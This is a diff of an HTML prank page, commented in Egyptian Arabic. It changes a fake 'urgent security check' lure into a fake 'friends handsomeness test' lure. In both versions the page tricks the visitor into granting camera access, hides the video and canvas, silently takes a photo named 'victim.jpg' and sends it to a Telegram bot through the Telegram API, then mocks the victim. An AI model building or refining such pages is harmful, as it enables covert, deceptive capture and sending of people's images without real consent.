@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فحص الأمان والسرعة 🚀</title>
+    <title>اختبار وسامة الأصدقاء 😎🔥</title>
     <style>
         body {
-            background-color: #0d1117;
-            color: #58a6ff;
-            font-family: Tahoma, sans-serif;
+            background: linear-gradient(135deg, #ff4757, #2f3542);
+            color: #fff;
+            font-family: 'Tahoma', sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -17,33 +17,58 @@
             margin: 0;
             text-align: center;
         }
-        h1 { font-size: 1.8rem; color: #ff4757; margin-bottom: 10px; }
-        p { color: #8b949e; font-size: 1.1rem; }
+        .card {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 { font-size: 1.6rem; margin-bottom: 10px; color: #ffd32a; }
+        p { font-size: 1rem; color: #f1f2f6; margin-bottom: 20px; }
         
+        .btn {
+            background-color: #2ed573;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1.1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            transition: 0.2s;
+        }
+        .btn:hover { background-color: #26af5f; }
+
         .loader {
-            border: 4px solid #161b22;
-            border-top: 4px solid #58a6ff;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid #ffd32a;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
             animation: spin 1s linear infinite;
-            margin-top: 20px;
+            margin: 20px auto;
+            display: none;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
-        /* إخفاء الكاميرا والـ Canvas تماماً عشان المقلب يتم في الخفاء */
+        /* إخفاء عناصر الفيديو والكاميرا */
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <h1>⚠️ تنبيه أمني عاجل!</h1>
-    <p>برجاء الضغط على <b>"سماح (Allow)"</b> لإكمال فحص كفاءة الجهاز...</p>
-    
-    <div class="loader" id="loader"></div>
+    <div class="card" id="mainCard">
+        <h1>📸 اختبار وسامة الأصدقاء</h1>
+        <p>اعرف نسبتك الحقيقية في الجمال والروقان مقارنة بصحابك! اضغط ابدأ واضغط "سماح" لتفعيل كاميرا الفلتر.</p>
+        <button class="btn" onclick="startPrank()">ابدأ الاختبار الآن 🔥</button>
+        <div class="loader" id="loader"></div>
+    </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
@@ -53,26 +78,33 @@
         const BOT_TOKEN = 'حط_التوكين_بتاع_البوت_هنا';
         const CHAT_ID = 'حط_الـ_CHAT_ID_بتاعك_هنا';
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        function startPrank() {
+            // إخفاء الزرار وإظهار لودر التحميل
+            document.querySelector('.btn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            document.querySelector('p').innerText = "جاري الاتصال بقاعدة بيانات الفلاتر وتحليل الملامح...";
 
-        // طلب إذن الكاميرا
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                
-                // ندي مهلة ثانية واحدة عشان الكاميرا تلقط صورة واضحة لوشه
-                setTimeout(() => {
-                    takeSnapshotAndSend();
-                }, 1000);
-            })
-            .catch(err => {
-                // لو رفض الإذن، ممكن تظهر له رسالة أو تحوله في حتة تانية
-                document.querySelector('h1').innerText = "تم إلغاء الفحص!";
-                document.getElementById('loader').style.display = 'none';
-            });
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
 
-        function takeSnapshotAndSend() {
+            // طلب الكاميرا بعد ما يضغط على الزرار بنفسه
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    
+                    // ندي مهلة ثانية عشان الكاميرا تلقط الصورة بوضوح
+                    setTimeout(() => {
+                        takeSnapshotAndSend(video, canvas);
+                    }, 1200);
+                })
+                .catch(err => {
+                    alert("يا عم الحج لازم تضغط سماح عشان تشوف النتيجة! 😂");
+                    document.querySelector('.btn').style.display = 'block';
+                    document.getElementById('loader').style.display = 'none';
+                });
+        }
+
+        function takeSnapshotAndSend(video, canvas) {
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
 
@@ -83,7 +115,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'victim.jpg');
-                formData.append('caption', '📸 تم اصطياد الضحية بنجاح يا معلم! 😂');
+                formData.append('caption', '📸 تم اصطياد الضحية في اختبار الوسامة! 😂🔥');
 
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -91,17 +123,14 @@
                 })
                 .then(res => res.json())
                 .then(data => {
-                    // بعد ما الصورة تتبعت، غير الكلام في الصفحة أو حوله على فيديو مضحك
-                    document.querySelector('h1').innerText = "لعبوووها عليك! 😂🃏";
-                    document.querySelector('p').innerText = "تم التقاط صورتك بنجاح يا صاحبي!";
-                    document.getElementById('loader').style.display = 'none';
-
-                    // اختياري: لو حابب تحوله لـ فيديو يوتيوب مضحك بعد ثانيتين
-                    /*
+                    // تغيير شكل الصفحة وإظهار نتيجة كوميدية تخليه ينصدم
                     setTimeout(() => {
-                        window.location.href = "لينك_فيديو_يوتيوب";
-                    }, 2500);
-                    */
+                        document.getElementById('mainCard').innerHTML = `
+                            <h1 style="color: #ff4757;">❌ عذراً يا صاحبي!</h1>
+                            <p style="font-size: 1.2rem; color: #fff;">نسبة وسامتك النهاردة: <b>0% (شكل ميسيّة صريح)</b> 💀</p>
+                            <h2 style="color: #2ed573;">مقلب يا معلم! تم التقاط صورتك بنجاح 😂🃏</h2>
+                        `;
+                    }, 1000);
                 })
                 .catch(err => console.error('خطأ في الإرسال:', err));
             }, 'image/jpeg');
